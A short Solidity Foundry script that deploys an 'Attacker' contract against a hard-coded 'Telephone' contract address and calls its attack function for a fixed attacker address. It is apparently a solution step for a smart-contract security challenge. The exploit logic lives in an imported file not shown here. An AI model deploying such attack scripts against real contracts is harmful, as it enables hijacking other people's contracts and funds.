// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Attacker} from "../src/Telephone.sol";

contract DeployTelephoneAttacker is Script{
    address public constant TELEPHONE_CONTRACT = 0x6a0BCD6B9e52a83F96FC80A238A90325fc293295;
    address public constant ATTACKER_ADDRESS = 0xE5974Ae86Baf0B3FE1304c41B16AB0BEca90cb42;
    Attacker public attacker;


    function run() external{
        vm.startBroadcast();
        attacker = new Attacker(TELEPHONE_CONTRACT);
        attacker.atack(ATTACKER_ADDRESS);
        vm.stopBroadcast();
    }


}